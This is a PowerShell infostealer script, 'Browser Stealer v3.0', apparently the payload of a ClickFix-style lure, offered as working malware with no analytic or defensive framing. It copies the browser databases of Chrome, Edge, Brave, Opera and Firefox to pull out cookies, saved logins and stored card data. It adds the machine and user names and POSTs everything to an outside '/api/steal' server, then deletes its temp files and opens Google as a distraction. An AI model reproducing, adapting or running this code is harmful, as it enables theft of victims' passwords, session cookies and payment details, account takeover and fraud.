# ============================================================
# BROWSER STEALER — No Syntax Errors
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

function Write-Color {
    param($Message, $Color)
    Write-Host $Message -ForegroundColor $Color
}

# ============================================================
# LOAD SQLITE
# ============================================================

function Load-SQLite {
    Write-Color "[+] Loading SQLite..." "Cyan"
    
    try {
        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
        Write-Color "[+] Microsoft.Data.Sqlite loaded" "Green"
        return "Microsoft.Data.Sqlite"
    } catch {
        Write-Color "[!] Microsoft.Data.Sqlite not available" "Yellow"
    }
    
    try {
        [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
        Write-Color "[+] System.Data.SQLite loaded" "Green"
        return "System.Data.SQLite"
    } catch {
        Write-Color "[!] System.Data.SQLite not available" "Yellow"
    }
    
    $dllPath = "$env:TEMP\System.Data.SQLite.dll"
    if (Test-Path $dllPath) {
        try {
            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
            Write-Color "[+] SQLite loaded from temp" "Green"
            return "System.Data.SQLite"
        } catch {}
    }
    
    Write-Color "[!] No SQLite available" "Red"
    return $null
}

$sqliteType = Load-SQLite

# ============================================================
# SQLITE HELPER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $results = @()
    
    if (-not (Test-Path $DbPath)) { return $results }
    if (-not $sqliteType) { return $results }
    
    try {
        $tempDb = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $tempDb -Force
        
        if ($sqliteType -eq "Microsoft.Data.Sqlite") {
            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tempDb")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $row = @{}
                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                    $name = $reader.GetName($i)
                    $value = $reader.GetValue($i)
                    if ($value -ne $null) {
                        $row[$name] = $value
                    }
                }
                $results += $row
            }
            $reader.Close()
            $conn.Close()
        } else {
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $row = @{}
                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                    $name = $reader.GetName($i)
                    $value = $reader.GetValue($i)
                    if ($value -ne $null) {
                        $row[$name] = $value
                    }
                }
                $results += $row
            }
            $reader.Close()
            $conn.Close()
        }
        
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        
    } catch {}
    return $results
}

# ============================================================
# COOKIE STEALER
# ============================================================

function Get-BrowserCookies {
    param($DbPath, $BrowserName)
    $cookies = @()
    if (-not (Test-Path $DbPath)) { return $cookies }
    if (-not $sqliteType) { return $cookies }
    
    $rows = Read-SQLite -DbPath $DbPath -Query "SELECT host_key, name, value FROM cookies"
    foreach ($row in $rows) {
        if ($row['name'] -and $row['value']) {
            $domain = $row['host_key']
            if ($domain) { $domain = $domain -replace '^\.', '' } else { $domain = "unknown" }
            $cookies += @{
                domain = $domain
                name = $row['name']
                value = $row['value']
                browser = $BrowserName
            }
        }
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    if (-not $sqliteType) { return $cookies }
    
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $cookieFile = "$($profile.FullName)\cookies.sqlite"
            if (Test-Path $cookieFile) {
                $rows = Read-SQLite -DbPath $cookieFile -Query "SELECT host, name, value FROM moz_cookies"
                foreach ($row in $rows) {
                    if ($row['name'] -and $row['value']) {
                        $domain = $row['host']
                        if ($domain) { $domain = $domain -replace '^\.', '' } else { $domain = "unknown" }
                        $cookies += @{
                            domain = $domain
                            name = $row['name']
                            value = $row['value']
                            browser = "Firefox"
                        }
                    }
                }
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER
# ============================================================

function Get-ChromePasswords {
    param($DbPath, $BrowserName)
    $passwords = @()
    if (-not (Test-Path $DbPath)) { return $passwords }
    if (-not $sqliteType) { return $passwords }
    
    $rows = Read-SQLite -DbPath $DbPath -Query "SELECT origin_url, username_value, password_value FROM logins"
    foreach ($row in $rows) {
        if ($row['username_value'] -and $row['password_value']) {
            $url = $row['origin_url']
            if ($url) { $url = $url -replace 'https?://', '' } else { $url = "unknown" }
            $passwords += @{
                url = $url
                username = $row['username_value']
                password = $row['password_value']
                browser = $BrowserName
            }
        }
    }
    return $passwords
}

function Get-OperaPasswords {
    $passwords = @()
    if (-not $sqliteType) { return $passwords }
    
    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
    if (Test-Path $path) {
        $rows = Read-SQLite -DbPath $path -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($row in $rows) {
            if ($row['username_value'] -and $row['password_value']) {
                $url = $row['origin_url']
                if ($url) { $url = $url -replace 'https?://', '' } else { $url = "unknown" }
                $passwords += @{
                    url = $url
                    username = $row['username_value']
                    password = $row['password_value']
                    browser = "Opera"
                }
            }
        }
    }
    return $passwords
}

function Get-FirefoxPasswords {
    $passwords = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $loginsFile = "$($profile.FullName)\logins.json"
            if (Test-Path $loginsFile) {
                try {
                    $content = Get-Content $loginsFile -Raw | ConvertFrom-Json
                    if ($content.logins) {
                        foreach ($login in $content.logins) {
                            $url = $login.hostname
                            if ($url) { $url = $url -replace 'https?://', '' } else { $url = "unknown" }
                            $passwords += @{
                                url = $url
                                username = $login.username
                                password = $login.password
                                browser = "Firefox"
                            }
                        }
                    }
                } catch {}
            }
        }
    }
    return $passwords
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-ChromeCards {
    param($DbPath, $BrowserName)
    $cards = @()
    if (-not (Test-Path $DbPath)) { return $cards }
    if (-not $sqliteType) { return $cards }
    
    $rows = Read-SQLite -DbPath $DbPath -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
    foreach ($row in $rows) {
        if ($row['name_on_card'] -and $row['card_number_encrypted']) {
            $cards += @{
                name = $row['name_on_card']
                number = $row['card_number_encrypted']
                month = $row['expiration_month']
                year = $row['expiration_year']
                browser = $BrowserName
            }
        }
    }
    return $cards
}

# ============================================================
# MAIN EXECUTION
# ============================================================

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME

Write-Color "" "White"
Write-Color "============================================" "Cyan"
Write-Color "  BROWSER STEALER v3.0" "Green"
Write-Color "  Target: $pcName" "Yellow"
Write-Color "============================================" "Cyan"
Write-Color "" "White"

# ---- COOKIES ----
$allCookies = @()

$paths = @(
    @{Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"; Name = "Chrome"},
    @{Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"; Name = "Edge"},
    @{Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"; Name = "Brave"},
    @{Path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"; Name = "Opera"}
)

foreach ($p in $paths) {
    Write-Color "[+] $($p.Name) cookies..." "Cyan"
    $allCookies += Get-BrowserCookies -DbPath $p.Path -BrowserName $p.Name
}

Write-Color "[+] Firefox cookies..." "Cyan"
$allCookies += Get-FirefoxCookies

# ---- PASSWORDS ----
$allPasswords = @()

$loginPaths = @(
    @{Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; Name = "Chrome"},
    @{Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"; Name = "Edge"},
    @{Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"; Name = "Brave"}
)

foreach ($p in $loginPaths) {
    Write-Color "[+] $($p.Name) passwords..." "Cyan"
    $allPasswords += Get-ChromePasswords -DbPath $p.Path -BrowserName $p.Name
}

Write-Color "[+] Opera passwords..." "Cyan"
$allPasswords += Get-OperaPasswords

Write-Color "[+] Firefox passwords..." "Cyan"
$allPasswords += Get-FirefoxPasswords

# ---- CARDS ----
$allCards = @()

$cardPaths = @(
    @{Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"; Name = "Chrome"},
    @{Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"; Name = "Edge"},
    @{Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"; Name = "Brave"}
)

foreach ($p in $cardPaths) {
    Write-Color "[+] $($p.Name) cards..." "Cyan"
    $allCards += Get-ChromeCards -DbPath $p.Path -BrowserName $p.Name
}

# ---- SUMMARY ----
Write-Color "" "White"
Write-Color "=== SUMMARY ===" "Green"
Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
Write-Color "Cards:      $($allCards.Count)" "Yellow"
Write-Color "" "White"

# ---- BUILD PAYLOAD ----
$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $pcName
        username = $userName
    }
    fingerprint = @{
        userAgent = "PowerShell"
        hostname = $pcName
    }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
}

# ---- SEND ----
Write-Color "[+] Sending data..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $webRequest = [System.Net.WebRequest]::Create($SERVER_URL)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "application/json"
    $webRequest.ContentLength = $bytes.Length
    $stream = $webRequest.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $webRequest.GetResponse()
    $response.Close()
    Write-Color "[+] Data sent successfully!" "Green"
} catch {
    Write-Color "[!] Failed to send: $_" "Red"
}

# ---- CLEANUP ----
Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# ---- DISTRACTION ----
Write-Color "[+] Done" "Green"
Start-Process "https://www.google.com"
